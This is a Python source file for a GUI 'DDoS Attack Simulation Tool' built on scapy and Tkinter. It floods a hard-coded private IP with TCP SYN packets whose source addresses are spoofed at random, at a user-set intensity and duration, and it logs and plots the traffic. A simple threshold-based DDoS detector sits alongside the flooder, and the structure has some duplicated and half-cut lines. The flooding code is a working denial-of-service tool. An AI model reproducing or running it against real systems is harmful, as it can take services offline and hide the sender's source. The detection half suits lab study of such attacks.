import time
import threading
import tkinter as tk
from tkinter import scrolledtext
from scapy.all import *
import logging
import psutil
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
import random

# Target IP address and port
target_ip = "192.168.31.132"  # Target IP address
target_port = 80  # Replace with your target port

# Packet to send (TCP SYN packet)
packet = IP(dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")

# Global variables to track statistics
total_packets_sent = 0
start_time = None
attack_in_progress = False
stop_attack_flag = False
# Global lists to track target IP traffic
target_ip_sent_bps_data = []
target_ip_recv_bps_data = []
target_ip_times = []
data_lock = threading.Lock()
# Global variables for new metrics
new_connections = 0
reset_packets = 0

# Packet Sniffing Function
# Global variables for new metrics
new_connections = 0
reset_packets = 0

# Packet Sniffing Function
def packet_sniffing():
    def packet_callback(packet):
        global data_lock, new_connections, reset_packets, unique_source_ips

        # Check if the packet is related to the target IP
        if IP in packet and (packet[IP].src == target_ip or packet[IP].dst == target_ip):
            with data_lock:
                packet_size_bits = len(packet) * 8
                current_time = time.time()

                # For packets originating from the target IP
                if packet[IP].src == target_ip:
                    target_ip_sent_bps_data.append((current_time, packet_size_bits))
                    target_ip_times.append(current_time)

                # For packets destined to the target IP
                elif packet[IP].dst == target_ip:
                    target_ip_recv_bps_data.append((current_time, packet_size_bits))
                    target_ip_times.append(current_time)

                # Count new TCP SYN connections to the target IP
                if TCP in packet and packet[TCP].flags == 'S' and packet[IP].dst == target_ip:
                    new_connections += 1

                # Count TCP RST packets
                if TCP in packet and packet[TCP].flags == 'R':
                    reset_packets += 1

                # Tracking unique source IPs
                unique_source_ips.add(packet[IP].src)

    sniff(prn=packet_callback, store=False, filter=f"ip host {target_ip}")

# Initialize Sniffing Thread
sniff_thread = threading.Thread(target=packet_sniffing)
sniff_thread.daemon = True
sniff_thread.start()

# Function to generate a random IP address
def generate_random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

# Function to send packets and log them
def send_packets(duration, intensity):
    global total_packets_sent
    global start_time
    global attack_in_progress
    global stop_attack_flag

    payload_size = 64  # Payload size
    payload = 'A' * payload_size

    start_time = time.time()
    attack_in_progress = True

    while True:
        if time.time() - start_time > duration or stop_attack_flag:
            break

        for _ in range(intensity):
            # Random source IP for each packet
            src_ip = generate_random_ip()
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S") / Raw(load=payload)
            send(packet, verbose=False)
            total_packets_sent += 1
            log_packet(packet, len(packet))  # Log the sent packet and its size

    attack_in_progress = False
    stop_attack_flag = False
    print("Attack stopped.")

# Modified log_packet function to include packet size
def log_packet(packet, packet_size):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    source_ip = packet[IP].src
    dest_ip = packet[IP].dst
    source_port = packet[TCP].sport
    dest_port = packet[TCP].dport
    flags = packet[TCP].flags
    packet_summary = f"Timestamp: {timestamp}, Source IP: {source_ip}, Dest IP: {dest_ip}, " \
                     f"Source Port: {source_port}, Dest Port: {dest_port}, Flags: {flags}, Packet Size: {packet_size}"
    logging.info(packet_summary)
    log_text.config(state=tk.NORMAL)
    log_text.insert(tk.END, f"{packet_summary}\n")
    log_text.config(state=tk.DISABLED)
    log_text.yview(tk.END)

# Function to display statistics
def display_statistics():
    global total_packets_sent, start_time, attack_in_progress

    while True:
        if start_time is not None:
            elapsed_time = time.time() - start_time
            bps = total_packets_sent / elapsed_time
            stats_text.config(text=f"Total Packets Sent: {total_packets_sent} | Network Traffic (bps): {bps:.2f}")

            if attack_in_progress:
                status_label.config(text="Attack in Progress")
            else:
                status_label.config(text="Attack Completed")

        time.sleep(1)
        
# Function to start the attack
def start_attack():
    global stop_attack_flag
    stop_attack_flag = False  
    duration = int(duration_entry.get())
    intensity = int(intensity_entry.get())

    attack_thread = threading.Thread(target=send_packets, args=(duration, intensity))
    attack_thread.start()
    
def stop_attack():
    global stop_attack_flag, new_connections, reset_packets, unique_source_ips
    stop_attack_flag = True
    # Reset the counters for new connections and reset packets
    new_connections = 0
    reset_packets = 0
    unique_source_ips.clear()
    print("Attack stopped.")


# Function to update the graph
def update_graph():
    with data_lock:  # Ensure thread safety
        # Clear the existing plot
        ax.clear()

        # Handle empty data
        if not target_ip_times:
            target_ip_times.append(time.time())  # Append current time
            target_ip_sent_bps_data.append((target_ip_times[-1], 0))  # Append zero data
            target_ip_recv_bps_data.append((target_ip_times[-1], 0))  # Append zero data

        # Extract and plot data for sent packets
        sent_times = [t for t, _ in target_ip_sent_bps_data]
        sent_bps = [bps for _, bps in target_ip_sent_bps_data]
        ax.plot(sent_times, sent_bps, label="Sent Traffic (bps)")

        # Extract and plot data for received packets
        recv_times = [t for t, _ in target_ip_recv_bps_data]
        recv_bps = [bps for _, bps in target_ip_recv_bps_data]
        #print(recv_bps)
        ax.plot(recv_times, recv_bps, label="Received Traffic (bps)")

        ax.legend()

    # Redraw the canvas
    canvas.draw()

    # Schedule the next update
    root.after(1000, update_graph)
   
# Initialize lists to store data
times = []
sent_bps_data = []
recv_bps_data = []

# Example variables for tracking
unique_source_ips = set()
average_normal_traffic = 1000  # Example value, adjust based on your network


# Enhanced DDoS detection function
def check_for_ddos():
    global total_packets_sent, unique_source_ips, average_normal_traffic, start_time, new_connections, reset_packets

    if start_time is None:
        return

    # Define threshold values
    new_connections_threshold = 50  
    reset_packets_threshold = 30     

    # Calculate current bps
    elapsed_time = time.time() - start_time
    current_bps = total_packets_sent / elapsed_time if elapsed_time > 0 else 0

    # Initialize alert variables
    alert_message = ""
    alert_color = "green"

    # Check for high traffic volume
    high_traffic_volume = current_bps > average_normal_traffic * 2

    # Check for multiple source IPs
    multiple_source_ips = len(unique_source_ips) > 100

    # Check for unusual number of new connections
    # print(new_connections)
    unusual_new_connections = new_connections > new_connections_threshold

    # Check for unusual number of TCP resets
    # print(reset_packets)
    unusual_reset_packets = reset_packets > reset_packets_threshold

    # Construct the alert message based on conditions
    if high_traffic_volume:
        alert_message += "High Traffic Volume\n "
    if multiple_source_ips:
        alert_message += "Multiple Source IPs\n "
    if unusual_new_connections:
        alert_message += "High Number of New Connections\n "
    if unusual_reset_packets:
        alert_message += "High Number of TCP Resets\n "

    # Set alert color and message
    if alert_message:
        alert_message = "Potential DDoS Attack Detected!:\n " + alert_message
        alert_color = "red"
    else:
        alert_message = "No unusual traffic detected."

    # Update the alert label
    alert_label.config(text=alert_message, fg=alert_color)

def ddos_check_thread():
    global start_time, unique_source_ips, total_packets_sent, attack_in_progress
    while True:
        if start_time is not None:
            check_for_ddos()
            if not attack_in_progress:
                unique_source_ips.clear()
        time.sleep(5)  # Check every 5 seconds
                
# Create the main window
root = tk.Tk()
root.title("DDoS Attack Simulation Tool")

# Create and configure the frame as part of the GUI
frame = tk.Frame(root)
frame.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")

attack_button = tk.Button(frame, text="Start Attack", command=start_attack)
attack_button.grid(row=0, column=0, pady=5)

stop_button = tk.Button(frame, text="Stop Attack", command=stop_attack)
stop_button.grid(row=0, column=1, pady=5)

duration_label = tk.Label(frame, text="Attack Duration (seconds):")
duration_label.grid(row=1, column=0, sticky="e")

duration_entry = tk.Entry(frame)
duration_entry.grid(row=1, column=1)

intensity_label = tk.Label(frame, text="Attack Intensity (packets per second):")
intensity_label.grid(row=2, column=0, sticky="e")

intensity_entry = tk.Entry(frame)
intensity_entry.grid(row=2, column=1)

stats_text = tk.Label(frame, text="Total Packets Sent: 0 | Network Traffic (bps): 0.00")
stats_text.grid(row=3, column=0, columnspan=2)

status_label = tk.Label(frame, text="Attack Status: Not Started")
status_label.grid(row=4, column=0, columnspan=2)

# Create a scrolled text widget for the logging panel
log_text = scrolledtext.ScrolledText(frame, height=50, width=120)  # Increase the width and height
log_text.grid(row=5, column=0, columnspan=2, padx=5, pady=5, sticky="nsew")  # Make the logging panel expandable
log_text.config(state=tk.DISABLED)

# Configure row and column weights for flexibility
frame.columnconfigure(0, weight=1)
frame.columnconfigure(1, weight=1)
frame.rowconfigure(5, weight=1)

# Initialize statistics disp# Initialize DDoS checking thread
ddos_thread = threading.Thread(target=ddos_check_thread)
ddos_thread.daemon = True  # This ensures the thread will close when the main program closes
ddos_thread.start()
stats_thread = threading.Thread(target=display_statistics)
stats_thread.daemon = True
stats_thread.start()

# Create a figure for the plot
fig, ax = plt.subplots()
    
# Function to zoom in or out
def zoom(event):
    base_scale = 1.1
    ax = plt.gca()

    # get the current x and y limits
    cur_xlim = ax.get_xlim()
    cur_ylim = ax.get_ylim()

    # Set the range
    cur_xrange = (cur_xlim[1] - cur_xlim[0]) * .5
    cur_yrange = (cur_ylim[1] - cur_ylim[0]) * .5

    xdata = event.xdata  # get event x location
    ydata = event.ydata  # get event y location

    if event.button == 'up':
        # deal with zoom in
        scale_factor = 1 / base_scale
    elif event.button == 'down':
        # deal with zoom out
        scale_factor = base_scale
    else:
        # deal with something that should never happen
        scale_factor = 1
        print(event.button)

    # Set new limits
    ax.set_xlim([xdata - cur_xrange * scale_factor,
                 xdata + cur_xrange * scale_factor])
    ax.set_ylim([ydata - cur_yrange * scale_factor,
                 ydata + cur_yrange * scale_factor])
    canvas.draw()  # redraw the canvas
    
# Create the canvas object from the figure
canvas = FigureCanvasTkAgg(fig, master=frame)

# Bind the zoom function to the scroll event on the canvas
canvas.mpl_connect('scroll_event', zoom)

# Embed the figure in the Tkinter window
canvas_widget = canvas.get_tk_widget()
canvas_widget.grid(row=5, column=2, columnspan=2,padx=5, pady=5, sticky='nsew')

# Start the initial update of the graph
root.after(1000, update_graph)

alert_label = tk.Label(frame, text="")
alert_label.grid(row=5, column=0, columnspan=2)

# Initialize DDoS checking thread
ddos_thread = threading.Thread(target=ddos_check_thread)
ddos_thread.daemon = True  # This ensures the thread will close when the main program closes
ddos_thread.start()

root.mainloop()